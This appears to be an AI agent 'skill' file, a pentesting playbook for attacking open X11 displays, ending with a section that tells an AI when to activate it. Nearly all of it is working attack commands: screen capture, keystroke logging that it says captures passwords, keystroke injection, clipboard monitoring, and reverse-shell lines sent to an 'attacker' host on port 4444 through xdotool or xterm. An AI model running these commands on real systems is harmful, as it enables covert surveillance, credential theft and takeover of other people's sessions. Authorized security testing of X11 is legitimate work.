# X11 Pentesting Skill

## Goal

Exploit X11 (X Window System) to capture screenshots, keystrokes, and gain remote access to graphical sessions.

## Methodology

1. **Discovery**: Identify X11 services
2. **Authentication Check**: Test for open X11 access
3. **Screenshot Capture**: Capture remote displays
4. **Keystroke Injection**: Send keystrokes to remote session
5. **Session Hijacking**: Access remote graphical sessions

## Port

- 6000/TCP: X11 display :0
- 6001/TCP: X11 display :1
- 6002-600X/TCP: Additional displays

## Tools

* **xdpyinfo**: X11 display information
* **xwd/xwud**: X11 window dump/undump
* **xdotool**: X11 automation
* **xspy**: X11 keystroke logger
* **nmap**: X11 scripts

## Example Commands

```bash
# Nmap X11 detection
nmap -p6000-6005 --script x11-* target
nmap -p6000 --script x11-access target

# Check if X11 accepts connections
xdpyinfo -display target:0

# If successful, X11 is open!
```

## Authentication Testing

```bash
# Try to connect to display
export DISPLAY=target:0
xdpyinfo

# If successful, the X server is unprotected
# "No protocol specified" or connection refused = protected

# Common misconfigurations:
# xhost + (allows all)
# xhost +local: (allows local)
# No xauth configured
```

## Screenshot Capture

```bash
# Using xwd (X Window Dump)
export DISPLAY=target:0

# Capture entire screen
xwd -root -display target:0 -out screenshot.xwd

# Convert to PNG
convert screenshot.xwd screenshot.png

# Or use ImageMagick import
import -window root -display target:0 screenshot.png

# Capture specific window (by ID)
xwd -id 0x3c00001 -display target:0 -out window.xwd
```

## List Windows

```bash
# List all windows
export DISPLAY=target:0
xwininfo -root -tree

# Get focused window info
xdotool getactivewindow

# List window titles
wmctrl -l
```

## Keystroke Logging

```bash
# Using xspy
xspy -display target:0

# This logs all keystrokes from the session!
# Captures passwords, messages, etc.

# Using xinput
xinput list  # List input devices
xinput test <device_id>  # Log input
```

## Keystroke Injection

```bash
# Using xdotool
export DISPLAY=target:0

# Type text
xdotool type "hello"

# Send specific key
xdotool key Return
xdotool key ctrl+alt+t  # Open terminal

# Move mouse
xdotool mousemove 100 100

# Click
xdotool click 1  # Left click

# Open terminal and run command
xdotool key ctrl+alt+t
sleep 1
xdotool type "id > /tmp/pwned"
xdotool key Return
```

## Remote Shell via X11

```bash
# Open terminal and execute commands
export DISPLAY=target:0

# GNOME Terminal
xdotool key ctrl+alt+t
sleep 2
xdotool type "bash -i >& /dev/tcp/attacker/4444 0>&1"
xdotool key Return

# Or launch xterm directly
xterm -display target:0 -e "/bin/bash -i >& /dev/tcp/attacker/4444 0>&1"
```

## Clipboard Access

```bash
# Read clipboard
export DISPLAY=target:0
xclip -o -selection clipboard

# Or using xsel
xsel --clipboard --output

# Watch clipboard changes
while true; do xclip -o -selection clipboard 2>/dev/null; sleep 2; done
```

## Metasploit Modules

```bash
# X11 screenshot
use auxiliary/gather/x11_capture

# X11 keyboard logger
use auxiliary/gather/x11_keylogger
```

## SSH X11 Forwarding Attack

```bash
# If you have SSH access with X11 forwarding enabled:

# Check if X11 forwarding is allowed
grep X11Forwarding /etc/ssh/sshd_config

# If enabled, SSH sessions may have DISPLAY exported
# Access other users' displays through their SSH sessions
```

## Nmap Scripts

```bash
# Check for open X11
nmap -p6000 --script x11-access target

# Results:
# open - X server accepting connections
# closed/filtered - protected or not running
```

## xhost Configuration

```bash
# On vulnerable server, might see:
xhost +    # Anyone can connect!
xhost +remote-host  # Specific host allowed

# Check current access list
xhost

# Secure configuration should show:
# access control enabled, only authorized clients can connect
```

## Guidance for AI

* Activate this skill when user wants to test X11 security or capture remote displays
* **X11 is often misconfigured** with `xhost +` allowing all connections
* Port 6000 + display number = actual port
* If `xdpyinfo -display target:0` works, server is wide open
* Attacks possible:
  - Screenshot capture
  - Keystroke logging
  - Keystroke injection (effectively full control)
  - Clipboard access
* X11 traffic is unencrypted by default
* SSH X11 forwarding can expose sessions
* Modern systems use Wayland (more secure) but X11 still common
* Check for X11 on servers with GUI (development machines, kiosks)
* xdotool for full control once connected
